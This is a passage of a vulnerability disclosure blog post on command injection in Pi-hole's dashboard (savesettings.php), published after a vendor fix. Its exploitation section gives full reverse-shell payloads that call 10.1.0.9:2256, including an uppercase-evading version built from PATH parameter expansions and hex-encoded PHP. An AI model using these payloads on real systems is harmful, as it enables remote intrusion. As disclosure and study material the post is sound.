</code><code>strtoupper</code><code>(</code><code>$mac</code><code>);</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code><code>(!</code><code>strlen</code><code>(</code><code>$error</code><code>))</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>exec</code><code>(</code><code>"sudo pihole -a removestaticdhcp "</code><code>.</code><code>$mac</code><code>);</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$success</code> <code>.= </code><code>"The static address with MAC address "</code><code>.htmlspecialchars(</code><code>$mac</code><code>).</code><code>" has been removed"</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>break</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>default</code><code>:</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$debug</code> <code>= true;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>break</code><code>;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code></p></div></div></div></div></div></div>



<p>Pi-hole’s Dashboard – <span>savesettings.php</span> – Original Code : <a href="https://github.com/pi-hole/AdminLTE/blob/master/scripts/pi-hole/php/savesettings.php" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Source</a></p>



<h2>Exploitation</h2>



<p>The biggest difficulty in exploiting this vulnerability is that the user input is capitalized through a call to “strtoupper”. Because of this, no lower case character can be used in the resulting injection.</p>



<p>Typically, the injection would look like this:</p>



<blockquote><p>aaaaaaaaaaaa&amp;&amp;php -r ‘$sock=fsockopen(“10.1.0.9”,2256);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p></blockquote>



<p>Here, our injection would be capitalized to “PHP -R”. As Linux commands are case sensitive, this would fail, yielding a “sh: 1: PHP: not found” error.</p>



<p>One way to overcome this difficulty is to make use of environment variables and of <s>nightmare-inducing</s> POSIX Shell Parameter Expansions. Note that the “sh” shell is used here.</p>



<div><figure><img data-attachment-id="46" data-permalink="https://natedotred.wordpress.com/capture-1/" data-orig-file="https://natedotred.files.wordpress.com/2020/02/capture-1.png" data-orig-size="1471,717" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="capture-1" data-image-description="" data-medium-file="https://natedotred.files.wordpress.com/2020/02/capture-1.png?w=300" data-large-file="https://natedotred.files.wordpress.com/2020/02/capture-1.png?w=750" src="https://natedotred.files.wordpress.com/2020/02/capture-1.png?w=1024" alt="" srcset="https://natedotred.files.wordpress.com/2020/02/capture-1.png?w=1024 1024w, https://natedotred.files.wordpress.com/2020/02/capture-1.png?w=150 150w, https://natedotred.files.wordpress.com/2020/02/capture-1.png?w=300 300w, https://natedotred.files.wordpress.com/2020/02/capture-1.png?w=768 768w, https://natedotred.files.wordpress.com/2020/02/capture-1.png 1471w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Inducing a PATH environment variable leak</figcaption></figure></div>



<p>It is possible to fetch the “PATH” environment variables on the server by postpending “$PATH” to a MAC address on a new static DHCP lease.</p>



<figure><img data-attachment-id="50" data-permalink="https://natedotred.wordpress.com/capture-3/" data-orig-file="https://natedotred.files.wordpress.com/2020/02/capture-3.png" data-orig-size="1494,804" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="capture-3" data-image-description="" data-medium-file="https://natedotred.files.wordpress.com/2020/02/capture-3.png?w=300" data-large-file="https://natedotred.files.wordpress.com/2020/02/capture-3.png?w=750" src="https://natedotred.files.wordpress.com/2020/02/capture-3.png?w=1024" alt="" srcset="https://natedotred.files.wordpress.com/2020/02/capture-3.png?w=1024 1024w, https://natedotred.files.wordpress.com/2020/02/capture-3.png?w=150 150w, https://natedotred.files.wordpress.com/2020/02/capture-3.png?w=300 300w, https://natedotred.files.wordpress.com/2020/02/capture-3.png?w=768 768w, https://natedotred.files.wordpress.com/2020/02/capture-3.png 1494w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>PATH Environment Variable Leakage</figcaption></figure>



<p>Luckily for us, the PATH contains the strings “pihole” and “usr” which in turn contains the “p”, “h” and “r” lower-case characters. Those are the only letters we need to write “php -r”.</p>



<blockquote><p>/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p></blockquote>



<p>For this PATH environment variable, it is possible to define the $P, $H and $R shell parameters that contain their matching lower-case character with the following POSIX Shell Parameter Expansions:</p>



<blockquote><p>W=${PATH#/???/}</p><p>P=${W%%?????:}</p><p>X=${PATH#/???/??}</p><p>H=${X%%???:}</p><p>Z=${PATH#:/??}</p><p>R=${Z%%/}</p></blockquote>



<p>With these shell parameters introduced, our injection can be rewritten as:</p>



<blockquote><p>$P$H$P$IFS-$R$IFS’EXEC(HEX2BIN(“706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27”));’</p></blockquote>



<p>Note that, here, neither PHP functions nor hexadecimal are case sensitive. $IFS corresponds to the default shell delimiter character which is a space.</p>



<p>Finally, our complete reverse shell payload is:</p>



<blockquote><p>aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS’EXEC(HEX2BIN(“706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27”));’&amp;&amp;</p></blockquote>



<p>Time to execute it!</p>



<figure><img data-attachment-id="65" data-permalink="https://natedotred.wordpress.com/capture-4/" data-orig-file="https://natedotred.files.wordpress.com/2020/02/capture-4.png" data-orig-size="1471,716" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="capture-4" data-image-description="" data-medium-file="https://natedotred.files.wordpress.com/2020/02/capture-4.png?w=300" data-large-file="https://natedotred.files.wordpress.com/2020/02/capture-4.png?w=750" src="https://natedotred.files.wordpress.com/2020/02/capture-4.png?w=1024" alt="" srcset="https://natedotred.files.wordpress.com/2020/02/capture-4.png?w=1024 1024w, https://natedotred.files.wordpress.com/2020/02/capture-4.png?w=150 150w, https://natedotred.files.wordpress.com/2020/02/capture-4.png?w=300 300w, https://natedotred.files.wordpress.com/2020/02/capture-4.png?w=768 768w, https://natedotred.files.wordpress.com/2020/02/capture-4.png 1471w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Injecting a reverse shell payload</figcaption></figure>



<figure><img data-attachment-id="67" data-permalink="https://natedotred.wordpress.com/capture-5/" data-orig-file="https://natedotred.files.wordpress.com/2020/02/capture-5.png" data-orig-size="1257,564" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="capture-5" data-image-description="" data-medium-file="https://natedotred.files.wordpress.com/2020/02/capture-5.png?w=300" data-large-file="https://natedotred.files.wordpress.com/2020/02/capture-5.png?w=750" src="https://natedotred.files.wordpress.com/2020/02/capture-5.png?w=1024" alt="" srcset="https://natedotred.files.wordpress.com/2020/02/capture-5.png?w=1024 1024w, https://natedotred.files.wordpress.com/2020/02/capture-5.png?w=150 150w, https://natedotred.files.wordpress.com/2020/02/capture-5.png?w=300 300w, https://natedotred.files.wordpress.com/2020/02/capture-5.png?w=768 768w, https://natedotred.files.wordpress.com/2020/02/capture-5.png 1257w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Receiving a shell and enumerating sudoers actions</figcaption></figure>



<p>Privilege escalation is left as an exercise to the reader.</p>



<h2>Time Line</h2>



<ul><li>François Renaud-Philippon disclosed the vulnerability to Pi-hole LLC on February 10, 2020.</li><li>Pi-hole LLC acknowledged receiving the report on February 10, 2020.</li><li>Pi-hole LLC fixed the vulnerability with the release of Pi-hole Web interface 4.3.3 on February 18, 2020.</li><li>Pi-hole LLC authorized public disclosure on February 19, 2020.</li></ul>



<p><em>Pi-hole® and the Pi-hole logo are Registered Trademark of Pi-hole LLC.</em></p>



<p> <em>Art from<a rel="noreferrer noopener" href="http://mangaonweb.com/read/index.php/item?id=12" target="_blank">ブラックジャックによろしく12</a>. ©<a rel="noreferrer noopener" href="https://twitter.com/shuho_sato" target="_blank">佐藤 秀峰</a></em></p>
			
			
				</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div></div>
    </div>
    <footer>
        <div>created by <a href="https://buildstarted.com">buildstarted</a> &copy; 2020 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
        <div>Customer satisfaction guaranteed to be optional.</div>
    </footer>
    
    <script async defer>
        _dna = window._dna || {};
        _dna.siteId = "linksfor.devs";
        _dna.outlink = true;

        (function() {
            let dna = document.createElement('script');
            dna.type = 'text/javascript';
            dna.async = true;
            dna.src = '//dna.buildstarted.com/t.js';
            let s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(dna, s);
        })();
    </script>
    <noscript><img src="//dna.buildstarted.com/g?siteId=linksfor.devs"/></noscript>
</body>
</html>